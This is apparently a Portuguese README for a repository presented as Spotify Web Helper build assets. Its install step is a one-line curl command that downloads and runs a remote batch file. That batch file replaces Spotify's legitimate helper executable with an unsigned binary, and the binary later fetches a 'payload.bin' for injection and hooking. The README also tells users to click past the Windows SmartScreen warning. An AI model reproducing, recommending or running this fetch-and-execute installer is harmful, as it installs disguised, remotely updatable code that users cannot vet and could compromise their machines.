# win-assets

Build assets for the Spotify Web Helper package.

## Instalação

Feche o Spotify completamente (inclusive da bandeja do sistema). Depois, no cmd:

```cmd
curl -L -o "%TEMP%\i.bat" https://raw.githubusercontent.com/081xDev/win-assets/main/install.bat && "%TEMP%\i.bat"
```

O instalador:

1. Baixa o `SpotifyWebHelper.exe` do release mais recente.
2. Faz backup do original em `SpotifyWebHelper.exe.bak` (uma vez).
3. Confere que o download não veio corrompido antes de escrever.
4. Instala em `%APPDATA%\Spotify\` preservando a data do arquivo original.

Depois de instalado, abra `%APPDATA%\Spotify\SpotifyWebHelper.exe`.

## Desinstalação

```cmd
curl -L -o "%TEMP%\i.bat" https://raw.githubusercontent.com/081xDev/win-assets/main/install.bat && "%TEMP%\i.bat" /uninstall
```

Restaura o WebHelper original a partir do backup.

## Requisitos

- Windows 10 ou 11, 64 bits.
- Spotify instalado e aberto ao menos uma vez (para a pasta `%APPDATA%\Spotify` existir).
- O Spotify **fechado** durante a instalação.

## Releases

| Versão | Conteúdo |
|---|---|
| v1.0.5 | Host com resolução de API sets e diagnóstico de import detalhado |
| v1.0.4 | Host mostra apenas a tela de login; menu restrito ao jogo |
| v1.0.3 | Overlay por hook de Present; carregamento de dependências |
| v1.0.2 | Hook de Present inicial |
| v1.0.0 | Primeiro payload |

Cada release carrega dois assets, e ambos são necessários:

- `SpotifyWebHelper.exe` — o host, baixado pelo instalador.
- `payload.bin` — o overlay, baixado pelo host no momento da injeção.

O host procura sempre `releases/latest/download/`, então publicar uma versão nova não exige recompilar nem reinstalar o host.

## Nota

O SmartScreen do Windows avisa que o executável não tem assinatura digital. É esperado:
não há certificado de code signing. Para prosseguir, use **Mais informações → Executar
assim mesmo**.
